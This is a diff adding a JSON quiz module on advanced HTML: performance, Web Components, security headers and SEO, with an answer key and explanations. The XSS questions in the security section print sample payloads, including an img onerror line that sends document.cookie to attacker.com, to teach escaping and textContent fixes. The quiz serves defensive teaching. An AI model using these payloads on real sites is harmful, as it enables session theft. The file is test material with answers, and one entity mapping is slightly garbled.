@@ -1,0 +1,409 @@
+{
+  "module_id": "html-advanced",
+  "module_title": "HTML Advanced-Q",
+  "type": "quiz",
+  "difficulty": "Advanced",
+  "companion_learning": "HTML Advanced-L",
+  "superquiz_pool": [
+    "A",
+    "B",
+    "C",
+    "D",
+    "E",
+    "F",
+    "G",
+    "H"
+  ],
+  "bloom_distribution": {
+    "L1_remember": 2,
+    "L2_understand": 2,
+    "L3_apply": 1
+  },
+  "mini_quizzes": [
+    {
+      "mq": 1,
+      "title": "MQ-1 \u00b7 Performance and Resource Loading",
+      "source_lesson": "ML-1",
+      "questions": [
+        {
+          "q_id": "Q10b3-MQ1-01",
+          "bloom": "L1",
+          "skill": "Define",
+          "stem": "What is the difference between the defer and async attributes on a <script> tag?",
+          "options": {
+            "A": "defer and async both block HTML parsing while the script downloads",
+            "B": "async downloads the script in parallel and executes it immediately when downloaded \u2014 potentially before parsing is complete, in any order. defer downloads the script in parallel but executes it only after HTML parsing is complete, in document order \u2014 safe for DOM-dependent scripts",
+            "C": "defer executes scripts before the <head> is parsed; async waits for the full page",
+            "D": "Both are identical \u2014 they only affect mobile browsers"
+          },
+          "answer": "B",
+          "explanation": "No attribute: parser blocks on download AND execution. async: non-blocking download, executes as soon as downloaded (unpredictable order \u2014 avoid for interdependent scripts). defer: non-blocking download, executes after DOMContentLoaded in source order \u2014 the correct default for most scripts. Rule of thumb: <script defer src='app.js'> in <head> for all non-critical scripts. async only for fully independent scripts (analytics).",
+          "source": "MDN Web Docs. <script> \u2014 defer and async. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attributes; Grigorik. High Performance Browser Networking. O'Reilly, 2013."
+        },
+        {
+          "q_id": "Q10b3-MQ1-02",
+          "bloom": "L1",
+          "skill": "Identify",
+          "stem": "What does <link rel='preload'> do, and when should it be used?",
+          "options": {
+            "A": "preload caches the resource permanently in the browser across all future visits",
+            "B": "preload instructs the browser to fetch a critical resource early in the page load \u2014 before it is discovered in the normal parsing flow \u2014 without blocking rendering. Used for above-the-fold images, web fonts, and critical scripts to reduce LCP (Largest Contentful Paint)",
+            "C": "preload is identical to prefetch \u2014 both load resources for the next page",
+            "D": "preload is deprecated and replaced by HTTP/2 Server Push"
+          },
+          "answer": "B",
+          "explanation": "<link rel='preload' as='font' href='font.woff2' type='font/woff2' crossorigin>. The as attribute is mandatory \u2014 tells the browser the resource type for correct priority and Content Security Policy checking. Use preload for: LCP hero image, critical web fonts (prevents FOUT), key JS bundles needed for first interaction. Misuse (preloading non-critical resources) degrades performance by competing with critical resources. Distinct from prefetch (low-priority, next-page resources).",
+          "source": "MDN Web Docs. Preloading content with rel=preload. https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preload; web.dev. Preload critical assets. https://web.dev/preload-critical-assets"
+        },
+        {
+          "q_id": "Q10b3-MQ1-03",
+          "bloom": "L2",
+          "skill": "Explain",
+          "stem": "Why does specifying width and height attributes on <img> elements improve Core Web Vitals performance?",
+          "options": {
+            "A": "width and height attributes make images load faster by compressing them",
+            "B": "When width and height are specified, the browser can calculate the image's aspect ratio before the image downloads and reserve the correct space in the layout \u2014 preventing Cumulative Layout Shift (CLS) as images load in and push content down",
+            "C": "width and height are only needed for SVG images, not raster images",
+            "D": "Specifying dimensions enables browser-side image compression"
+          },
+          "answer": "B",
+          "explanation": "CLS (Cumulative Layout Shift) is a Core Web Vitals metric measuring unexpected layout movement. Without dimensions: browser allocates 0\u00d70 space \u2192 image loads \u2192 layout shifts \u2192 CLS score increases. With width='800' height='600': browser calculates 4:3 aspect ratio, reserves space via intrinsic aspect-ratio. Modern CSS: img { max-width: 100%; height: auto; } respects the declared ratio responsively. Google's CWV threshold: CLS < 0.1 for 'Good'.",
+          "source": "web.dev. Cumulative Layout Shift. https://web.dev/cls; MDN Web Docs. Images in HTML. https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Images_in_HTML"
+        },
+        {
+          "q_id": "Q10b3-MQ1-04",
+          "bloom": "L2",
+          "skill": "Describe",
+          "stem": "What is the srcset attribute on <img>, and how does it improve performance on different screen densities and sizes?",
+          "options": {
+            "A": "srcset allows the browser to load multiple images simultaneously for faster display",
+            "B": "srcset provides a list of image candidates at different resolutions or widths \u2014 the browser selects the most appropriate one based on device pixel ratio and viewport size, serving retina-quality images to HiDPI screens while serving smaller files to standard displays",
+            "C": "srcset is a CSS property that replaces the src attribute on images",
+            "D": "srcset is only supported in Chrome and not cross-browser compatible"
+          },
+          "answer": "B",
+          "explanation": "Width descriptor: srcset='img-400.jpg 400w, img-800.jpg 800w, img-1600.jpg 1600w' with sizes='(max-width: 600px) 400px, 800px'. Browser picks the best candidate. Pixel density descriptor: srcset='img.jpg 1x, img@2x.jpg 2x' \u2014 serve 2\u00d7 image on Retina displays. Without srcset: mobile devices download full desktop images (~300KB+). With srcset: mobile may get a 40KB version. Critical for LCP and data-conscious users.",
+          "source": "MDN Web Docs. Responsive images. https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images; web.dev. Serve responsive images. https://web.dev/serve-responsive-images"
+        },
+        {
+          "q_id": "Q10b3-MQ1-05",
+          "bloom": "L3",
+          "skill": "Apply",
+          "stem": "A page has a hero image (above the fold, 1200px wide on desktop, full-width on mobile) that is the LCP element. Write the optimal HTML to maximise LCP performance.",
+          "options": {
+            "A": "<img src='hero.jpg' style='width:100%'>",
+            "B": "<img src='hero-1200.jpg' srcset='hero-400.jpg 400w, hero-800.jpg 800w, hero-1200.jpg 1200w' sizes='(max-width: 768px) 100vw, 1200px' alt='Hero image description' width='1200' height='600' fetchpriority='high'>",
+            "C": "<img src='hero.jpg' loading='lazy' alt='Hero'>",
+            "D": "<link rel='preload' as='image' href='hero.jpg'><img src='hero.jpg' alt='Hero'>"
+          },
+          "answer": "B",
+          "explanation": "Option B is optimal: srcset provides responsive image candidates; sizes tells browser which candidate to pick at each viewport width; alt is descriptive; width/height prevent CLS; fetchpriority='high' overrides the browser's default priority heuristic to load the LCP image sooner (replaces the older <link rel=preload> pattern). Crucially: NO loading='lazy' on above-the-fold LCP images \u2014 lazy loading delays the LCP element. Option C applies lazy loading to the LCP image \u2014 a critical performance anti-pattern.",
+          "source": "web.dev. Largest Contentful Paint. https://web.dev/lcp; MDN. fetchpriority. https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/fetchPriority"
+        }
+      ]
+    },
+    {
+      "mq": 2,
+      "title": "MQ-2 \u00b7 HTML APIs and Web Components",
+      "source_lesson": "ML-2",
+      "questions": [
+        {
+          "q_id": "Q10b3-MQ2-01",
+          "bloom": "L1",
+          "skill": "Define",
+          "stem": "What is the HTML <template> element and what is its key behaviour in the browser?",
+          "options": {
+            "A": "<template> defines a CSS template layout applied to child elements",
+            "B": "<template> holds inert HTML markup that is parsed but not rendered or executed \u2014 its content is stored in a DocumentFragment and can be cloned and inserted into the DOM dynamically via JavaScript, making it the foundation of Web Components",
+            "C": "<template> is a server-side element that renders HTML partials",
+            "D": "<template> is identical to <div> but with a semantic name for layout sections"
+          },
+          "answer": "B",
+          "explanation": "<template> content: not rendered, scripts not executed, images not loaded, styles not applied \u2014 until JavaScript clones and appends it. const tmpl = document.querySelector('template'); const clone = tmpl.content.cloneNode(true); document.body.appendChild(clone). Used in Web Components to define shadow DOM structure. Critical distinction: content is in template.content (a DocumentFragment), not template itself.",
+          "source": "MDN Web Docs. <template>. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template; MDN. Web Components. https://developer.mozilla.org/en-US/docs/Web/API/Web_components"
+        },
+        {
+          "q_id": "Q10b3-MQ2-02",
+          "bloom": "L1",
+          "skill": "Identify",
+          "stem": "What are the three core technologies that make up Web Components?",
+          "options": {
+            "A": "React, Vue, and Angular",
+            "B": "Custom Elements (define new HTML elements with custom behaviour), Shadow DOM (encapsulated DOM and CSS scoped to the component), and HTML Templates (<template> and <slot> for reusable markup)",
+            "C": "Web Workers, Service Workers, and Web Sockets",
+            "D": "CSS Grid, Flexbox, and CSS Variables"
+          },
+          "answer": "B",
+          "explanation": "Web Components: (1) Custom Elements \u2014 class MyComponent extends HTMLElement { connectedCallback(){} } + customElements.define('my-component', MyComponent). Use as <my-component>. (2) Shadow DOM \u2014 this.attachShadow({mode:'open'}) creates isolated DOM/CSS. Styles don't leak in or out. (3) HTML Templates \u2014 <template> defines the markup; <slot> defines insertion points for light DOM content (slot='header'). All are native browser APIs, no framework required.",
+          "source": "MDN Web Docs. Web Components. https://developer.mozilla.org/en-US/docs/Web/API/Web_components; web.dev. Web Components. https://web.dev/web-components"
+        },
+        {
+          "q_id": "Q10b3-MQ2-03",
+          "bloom": "L2",
+          "skill": "Explain",
+          "stem": "What is Shadow DOM encapsulation and why is it valuable for component-based development?",
+          "options": {
+            "A": "Shadow DOM is a security feature that hides HTML source code from browser developer tools",
+            "B": "Shadow DOM creates an isolated DOM subtree attached to an element where styles and scripts are scoped to the component \u2014 global CSS cannot affect the component's internals, and the component's styles cannot leak out \u2014 enabling truly reusable components without naming collision or style conflicts",
+            "C": "Shadow DOM improves rendering performance by hiding off-screen components",
+            "D": "Shadow DOM is only available in Chrome and Safari, not Firefox"
+          },
+          "answer": "B",
+          "explanation": "Shadow DOM solves CSS global scope problems: a button component's :hover styles won't accidentally affect other buttons on the page. Terminology: shadow host (the custom element), shadow root (the root of the shadow tree), shadow tree (internal DOM), light DOM (children passed by the consumer via <slot>). Mode 'open': JS outside can access shadowRoot. Mode 'closed': shadowRoot returns null externally. Used in browser-native elements: <input>, <video> controls use shadow DOM.",
+          "source": "MDN Web Docs. Using shadow DOM. https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM"
+        },
+        {
+          "q_id": "Q10b3-MQ2-04",
+          "bloom": "L2",
+          "skill": "Compare",
+          "stem": "How does the <dialog> element compare to a custom div-based modal in terms of accessibility and built-in behaviour?",
+          "options": {
+            "A": "<dialog> and custom div modals are identical in accessibility and behaviour",
+            "B": "<dialog> provides built-in: focus trapping (keyboard focus is constrained to the dialog while open), the ::backdrop pseudo-element for overlay, the showModal()/close() API, and correct ARIA role='dialog' semantics \u2014 all of which must be manually implemented for a div-based modal, where common errors cause keyboard navigation to escape the modal",
+            "C": "Custom div modals are more accessible than <dialog> because they are more flexible",
+            "D": "<dialog> is only supported in Firefox and not cross-browser compatible"
+          },
+          "answer": "B",
+          "explanation": "<dialog> native benefits: (1) focus trap \u2014 Tab key stays within dialog; (2) Escape key closes modal dialogs automatically; (3) ::backdrop for the semi-transparent overlay (no extra div); (4) role='dialog' and aria-modal semantics; (5) showModal() pushes to the top layer (above fixed positioning). Custom div modals commonly miss focus trapping, causing keyboard and screen reader users to navigate behind the modal. <dialog> is now baseline-supported (Chrome, Firefox, Safari 2022+).",
+          "source": "MDN Web Docs. <dialog>. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog; web.dev. Building a dialog component. https://web.dev/building-a-dialog-component"
+        },
+        {
+          "q_id": "Q10b3-MQ2-05",
+          "bloom": "L3",
+          "skill": "Design",
+          "stem": "Design a reusable <info-card> Web Component that displays a title and description passed as attributes. Outline the implementation.",
+          "options": {
+            "A": "Use a <div class='info-card'> with CSS \u2014 Web Components are not needed for simple UI",
+            "B": "(1) Define class InfoCard extends HTMLElement; (2) attach shadow DOM in constructor with this.attachShadow({mode:'open'}); (3) in connectedCallback, read this.getAttribute('title') and this.getAttribute('description'); (4) set shadowRoot.innerHTML with a <template>-based structure including scoped <style>; (5) customElements.define('info-card', InfoCard); (6) use as <info-card title='Hello' description='World'></info-card>",
+            "C": "Use document.createElement('div') with id='info-card' \u2014 custom element names require a hyphen which is a syntax error",
+            "D": "Web Components require a build tool like Webpack \u2014 they cannot be written in plain HTML/JS"
+          },
+          "answer": "B",
+          "explanation": "Custom element names MUST contain a hyphen (info-card) \u2014 this distinguishes them from native HTML elements and prevents future naming conflicts. Implementation: constructor() calls super() first; attachShadow in constructor; connectedCallback fires when element is added to DOM; observedAttributes + attributeChangedCallback handle dynamic attribute updates. Shadow DOM scopes the <style> block. No build tools required \u2014 native browser APIs.",
+          "source": "MDN Web Docs. Using custom elements. https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_custom_elements"
+        }
+      ]
+    },
+    {
+      "mq": 3,
+      "title": "MQ-3 \u00b7 Content Security, Integrity and Security Headers",
+      "source_lesson": "ML-3",
+      "questions": [
+        {
+          "q_id": "Q10b3-MQ3-01",
+          "bloom": "L1",
+          "skill": "Define",
+          "stem": "What is Subresource Integrity (SRI) and why is it important when loading scripts or stylesheets from a CDN?",
+          "options": {
+            "A": "SRI compresses CSS and JS files served from CDNs to reduce file size",
+            "B": "SRI uses a cryptographic hash in the integrity attribute on <script> and <link> elements \u2014 the browser verifies the downloaded file matches the hash before executing it, protecting against CDN compromise where an attacker replaces a legitimate library with malicious code",
+            "C": "SRI is a server-side technique that encrypts CDN traffic using HTTPS",
+            "D": "SRI prevents hotlinking of images from third-party CDNs"
+          },
+          "answer": "B",
+          "explanation": "SRI example: <script src='https://cdn.example.com/lib.js' integrity='sha384-abc123...' crossorigin='anonymous'></script>. If the CDN serves a file with a different hash (due to compromise or supply chain attack), the browser refuses to execute it. The crossorigin='anonymous' attribute is required for cross-origin SRI checks (sends CORS request without credentials). Generate hashes at: https://www.srihash.org or via openssl dgst -sha384 -binary file.js | openssl base64.",
+          "source": "MDN Web Docs. Subresource Integrity. https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity; W3C. SRI Specification. https://www.w3.org/TR/SRI"
+        },
+        {
+          "q_id": "Q10b3-MQ3-02",
+          "bloom": "L1",
+          "skill": "Identify",
+          "stem": "What does the sandbox attribute on an <iframe> do?",
+          "options": {
+            "A": "sandbox makes the iframe load content faster by caching it locally",
+            "B": "sandbox applies a strict set of restrictions to the iframe's content \u2014 blocking scripts, form submission, popups, and same-origin access by default. Specific capabilities can be selectively re-enabled using values like allow-scripts or allow-forms",
+            "C": "sandbox prevents the iframe from displaying third-party cookies",
+            "D": "sandbox forces the iframe content to load over HTTPS"
+          },
+          "answer": "B",
+          "explanation": "sandbox with no value: maximum restrictions \u2014 no scripts, no forms, no popups, no same-origin access, treated as unique origin. Selective re-enabling: sandbox='allow-scripts allow-same-origin'. Warning: allow-scripts + allow-same-origin together can allow the framed content to remove the sandbox attribute \u2014 use carefully. Best practice for untrusted content: sandbox='allow-scripts' only. Used for embedding user-generated content, third-party widgets, and online code editors.",
+          "source": "MDN Web Docs. <iframe> sandbox. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox; HTML Living Standard. https://html.spec.whatwg.org/multipage/iframe-embed-object.html"
+        },
+        {
+          "q_id": "Q10b3-MQ3-03",
+          "bloom": "L2",
+          "skill": "Explain",
+          "stem": "What is a Content Security Policy (CSP) and how does the <meta http-equiv='Content-Security-Policy'> tag relate to HTTP header-based CSP?",
+          "options": {
+            "A": "CSP is an HTML attribute that prevents XSS by blocking all inline JavaScript",
+            "B": "CSP is a security policy delivered via HTTP header (Content-Security-Policy) or <meta> tag that tells browsers which content sources are trusted \u2014 restricting script, style, image, and font origins to prevent XSS and data injection. The <meta> tag approach has limitations: it cannot use frame-ancestors, sandbox, or report-uri directives, making HTTP headers the preferred delivery method",
+            "C": "CSP is only effective against CSRF attacks, not XSS",
+            "D": "The <meta> CSP tag is identical to the HTTP header in all respects"
+          },
+          "answer": "B",
+          "explanation": "CSP example: Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; img-src *; style-src 'self' 'unsafe-inline'. Via meta: <meta http-equiv='Content-Security-Policy' content='default-src self'>. Meta CSP limitations: cannot set frame-ancestors (clickjacking protection), sandbox, or report-uri. HTTP header is processed before any HTML parsing \u2014 stronger protection. Strict CSP eliminates 'unsafe-inline' which blocks most XSS vectors.",
+          "source": "MDN Web Docs. Content Security Policy. https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP; web.dev. Content Security Policy. https://web.dev/csp"
+        },
+        {
+          "q_id": "Q10b3-MQ3-04",
+          "bloom": "L2",
+          "skill": "Describe",
+          "stem": "What is Cross-Site Scripting (XSS) and how does proper HTML escaping prevent it?",
+          "options": {
+            "A": "XSS is an attack where an attacker gains physical access to a web server",
+            "B": "XSS: an attacker injects malicious scripts into web pages viewed by other users \u2014 typically by exploiting unescaped user input rendered as HTML. Prevention: escape all user-supplied data before inserting into HTML (& \u2192 &amp;, < \u2192 &lt;, > \u2192 &gt;, ' \u2192 &#x27;, ' \u2192 &quot;) \u2014 converting characters that have HTML meaning into harmless entities",
+            "C": "XSS only affects websites that use JavaScript \u2014 static HTML sites are immune",
+            "D": "HTML escaping is only needed for content inside <script> tags"
+          },
+          "answer": "B",
+          "explanation": "Reflected XSS: user input returned in the page without escaping. Stored XSS: malicious input persisted in DB then rendered. DOM XSS: client-side JavaScript writes user input to innerHTML. Prevention: (1) output encoding \u2014 escape before rendering in HTML context; (2) use textContent/innerText instead of innerHTML; (3) CSP blocks inline scripts even if injection succeeds; (4) sanitise HTML with DOMPurify when rich text is required. innerHTML with user data is a critical vulnerability.",
+          "source": "OWASP. Cross Site Scripting Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        },
+        {
+          "q_id": "Q10b3-MQ3-05",
+          "bloom": "L3",
+          "skill": "Evaluate",
+          "stem": "A developer writes: document.getElementById('output').innerHTML = userInput; to display a user's name on the page. Evaluate the security risk and provide the correct fix.",
+          "options": {
+            "A": "No risk \u2014 innerHTML is the standard way to display user content",
+            "B": "Critical DOM XSS vulnerability: if userInput contains <script>alert('XSS')</script> or <img src=x onerror='stealCookies()'>, the script executes in the user's browser with full page access. Fix: use textContent instead \u2014 document.getElementById('output').textContent = userInput \u2014 which treats the input as plain text and never executes it as HTML. If HTML formatting is required, sanitise with DOMPurify.sanitize(userInput) before assigning to innerHTML",
+            "C": "The risk is low \u2014 browsers block script injection via innerHTML automatically",
+            "D": "Fix by adding encodeURIComponent(userInput) before assigning to innerHTML"
+          },
+          "answer": "B",
+          "explanation": "innerHTML parses and executes HTML including event handlers: <img src=x onerror='fetch(attacker.com/?c='+document.cookie)'> steals session cookies. textContent is the correct fix \u2014 it sets the text node content without parsing HTML. encodeURIComponent (option D) encodes for URLs, not HTML \u2014 does not prevent XSS in innerHTML context. DOMPurify is the correct sanitiser when rich HTML is genuinely required (user-submitted blog posts, comments).",
+          "source": "OWASP. DOM XSS. https://owasp.org/www-community/attacks/DOM_Based_XSS; MDN Web Docs. Element.innerHTML \u2014 Security considerations. https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations"
+        }
+      ]
+    },
+    {
+      "mq": 4,
+      "title": "MQ-4 \u00b7 HTML and SEO, Structured Data and Modern Patterns",
+      "source_lesson": "ML-4",
+      "questions": [
+        {
+          "q_id": "Q10b3-MQ4-01",
+          "bloom": "L1",
+          "skill": "Define",
+          "stem": "What is JSON-LD structured data in HTML, and what is its purpose?",
+          "options": {
+            "A": "JSON-LD is a JavaScript library for loading data from REST APIs",
+            "B": "JSON-LD (JSON for Linked Data) is a structured data format embedded in a <script type='application/ld+json'> block in HTML \u2014 it describes page content using Schema.org vocabulary, enabling search engines to understand entities (products, events, recipes, reviews) and display rich results (star ratings, prices, event dates) in SERPs",
+            "C": "JSON-LD is a CSS-in-JS technique for styling components",
+            "D": "JSON-LD is Google's proprietary format for AMP (Accelerated Mobile Pages)"
+          },
+          "answer": "B",
+          "explanation": "JSON-LD example: <script type='application/ld+json'>{\"@context\":\"https://schema.org\",\"@type\":\"Product\",\"name\":\"Widget\",\"offers\":{\"@type\":\"Offer\",\"price\":\"9.99\",\"priceCurrency\":\"GBP\"}}</script>. Google, Bing, and Yahoo parse this to generate rich snippets. Preferred by Google over Microdata or RDFa because it does not require modifying existing HTML markup \u2014 cleanly separates structured data from presentation.",
+          "source": "Google. Introduction to structured data. https://developers.google.com/search/docs/appearance/structured-data/intro-structured-data; Schema.org. https://schema.org"
+        },
+        {
+          "q_id": "Q10b3-MQ4-02",
+          "bloom": "L1",
+          "skill": "Identify",
+          "stem": "What is the purpose of the <link rel='canonical'> element in HTML?",
+          "options": {
+            "A": "rel='canonical' loads the website's CSS stylesheet",
+            "B": "rel='canonical' tells search engines which URL is the preferred (canonical) version of a page when the same content is accessible via multiple URLs \u2014 preventing duplicate content penalties in search rankings",
+            "C": "rel='canonical' marks a page as the homepage of the website",
+            "D": "rel='canonical' is used to specify the language of the page content"
+          },
+          "answer": "B",
+          "explanation": "Duplicate content scenarios: HTTP vs HTTPS, www vs non-www, URL parameters (?ref=email), paginated pages. Example: <link rel='canonical' href='https://www.example.com/product/widget'> on all variants. Without canonical tags, search engines may split PageRank across duplicate URLs or index the wrong version. Self-referential canonical (page points to itself) is best practice on all pages. Also used for syndicated content to credit the original source.",
+          "source": "Google Search Central. Consolidate duplicate URLs. https://developers.google.com/search/docs/crawling-indexing/consolidate-duplicate-urls; MDN Web Docs. rel=canonical. https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel"
+        },
+        {
+          "q_id": "Q10b3-MQ4-03",
+          "bloom": "L2",
+          "skill": "Explain",
+          "stem": "What is the Intersection Observer API and how is it used in HTML/JavaScript for performance optimisation?",
+          "options": {
+            "A": "Intersection Observer tracks mouse cursor position relative to elements",
+            "B": "Intersection Observer is a browser API that asynchronously observes when a target element enters or exits the viewport \u2014 enabling lazy loading of images/iframes, infinite scroll, and scroll-triggered animations without expensive scroll event listeners that block the main thread",
+            "C": "Intersection Observer is a CSS feature that applies styles when elements overlap",
+            "D": "Intersection Observer requires a polyfill in all browsers including Chrome"
+          },
+          "answer": "B",
+          "explanation": "const observer = new IntersectionObserver((entries) => { entries.forEach(e => { if(e.isIntersecting) { e.target.src = e.target.dataset.src; observer.unobserve(e.target); } }); }, { rootMargin: '200px' }); document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img)). Advantages over scroll listeners: runs off main thread, batched, threshold-based. rootMargin: '200px' starts loading 200px before the image enters viewport \u2014 prevents visible loading gaps.",
+          "source": "MDN Web Docs. Intersection Observer API. https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API; web.dev. Lazy loading images. https://web.dev/lazy-loading-images"
+        },
+        {
+          "q_id": "Q10b3-MQ4-04",
+          "bloom": "L2",
+          "skill": "Compare",
+          "stem": "How does the HTML <picture> element differ from <img srcset> for responsive images, and when should each be used?",
+          "options": {
+            "A": "<picture> and <img srcset> are identical \u2014 use either interchangeably",
+            "B": "<img srcset> lets the browser choose the best resolution/size candidate \u2014 the art direction remains the same. <picture> enables art direction: serving completely different images (cropped, composed differently) at different viewport sizes using <source media='...'> conditions, plus format switching (WebP with JPEG fallback). Use srcset for resolution switching; use <picture> for art direction or format negotiation",
+            "C": "<picture> is deprecated in HTML5; use <img srcset> exclusively",
+            "D": "<img srcset> supports WebP; <picture> only supports JPEG and PNG"
+          },
+          "answer": "B",
+          "explanation": "Resolution switching (srcset): same image, different sizes \u2014 browser chooses. <picture> art direction: <picture><source media='(max-width:600px)' srcset='portrait.jpg'><source media='(min-width:601px)' srcset='landscape.jpg'><img src='landscape.jpg' alt='...'></picture> \u2014 mobile gets a portrait crop, desktop gets the wide landscape. <picture> also for format negotiation: <source type='image/avif' srcset='img.avif'><source type='image/webp' srcset='img.webp'><img src='img.jpg'>. Always include <img> as fallback.",
+          "source": "MDN Web Docs. Responsive images. https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images"
+        },
+        {
+          "q_id": "Q10b3-MQ4-05",
+          "bloom": "L3",
+          "skill": "Evaluate",
+          "stem": "Audit this HTML head section and identify all performance, SEO, and security issues: <head><title>Home</title><script src='app.js'></script><link rel='stylesheet' href='style.css'><meta name='viewport' content='width=device-width'></head>",
+          "options": {
+            "A": "No issues \u2014 this is a well-optimised HTML head",
+            "B": "Four issues: (1) <script src='app.js'> blocks HTML parsing \u2014 add defer attribute; (2) <meta name='viewport'> missing initial-scale=1 \u2014 add content='width=device-width, initial-scale=1'; (3) Missing <meta charset='UTF-8'> \u2014 character encoding must be declared within first 1024 bytes; (4) Title 'Home' is non-descriptive for SEO \u2014 should be meaningful (e.g., 'Company Name \u2014 Homepage'). Additionally: missing <meta name='description'>, no CSP, no canonical link",
+            "C": "Only the missing charset meta tag is an issue",
+            "D": "The script tag should be moved to the <body> \u2014 that is the only fix needed"
+          },
+          "answer": "B",
+          "explanation": "(1) Render-blocking script: parser stops at <script> until download+execution complete \u2014 defer fixes this. (2) initial-scale=1 omission: some browsers may apply their own zoom level. (3) Missing charset: the HTML5 spec requires charset within the first 1024 bytes \u2014 missing it risks mojibake on non-ASCII content (browser must sniff encoding). (4) 'Home' title: search engines use title as the primary SERP label \u2014 non-descriptive titles hurt CTR and SEO. Moving to <body> (option D) is a legacy pattern; defer in <head> is the modern standard.",
+          "source": "MDN Web Docs. What's in the head. https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/The_head_metadata_in_HTML; web.dev. Render-blocking resources. https://web.dev/render-blocking-resources"
+        }
+      ]
+    }
+  ],
+  "table_of_contents": [
+    {
+      "mq": 1,
+      "title": "MQ-1 \u00b7 Performance and Resource Loading",
+      "bloom_mix": "2\u00d7L1, 2\u00d7L2, 1\u00d7L3",
+      "q_ids": [
+        "Q10b3-MQ1-01",
+        "Q10b3-MQ1-02",
+        "Q10b3-MQ1-03",
+        "Q10b3-MQ1-04",
+        "Q10b3-MQ1-05"
+      ]
+    },
+    {
+      "mq": 2,
+      "title": "MQ-2 \u00b7 HTML APIs and Web Components",
+      "bloom_mix": "2\u00d7L1, 2\u00d7L2, 1\u00d7L3",
+      "q_ids": [
+        "Q10b3-MQ2-01",
+        "Q10b3-MQ2-02",
+        "Q10b3-MQ2-03",
+        "Q10b3-MQ2-04",
+        "Q10b3-MQ2-05"
+      ]
+    },
+    {
+      "mq": 3,
+      "title": "MQ-3 \u00b7 Content Security, Integrity and Security Headers",
+      "bloom_mix": "2\u00d7L1, 2\u00d7L2, 1\u00d7L3",
+      "q_ids": [
+        "Q10b3-MQ3-01",
+        "Q10b3-MQ3-02",
+        "Q10b3-MQ3-03",
+        "Q10b3-MQ3-04",
+        "Q10b3-MQ3-05"
+      ]
+    },
+    {
+      "mq": 4,
+      "title": "MQ-4 \u00b7 HTML and SEO, Structured Data and Modern Patterns",
+      "bloom_mix": "2\u00d7L1, 2\u00d7L2, 1\u00d7L3",
+      "q_ids": [
+        "Q10b3-MQ4-01",
+        "Q10b3-MQ4-02",
+        "Q10b3-MQ4-03",
+        "Q10b3-MQ4-04",
+        "Q10b3-MQ4-05"
+      ]
+    }
+  ],
+  "totals": {
+    "mini_quizzes": 4,
+    "questions": 20,
+    "L1": 8,
+    "L2": 8,
+    "L3": 4
+  }
+}
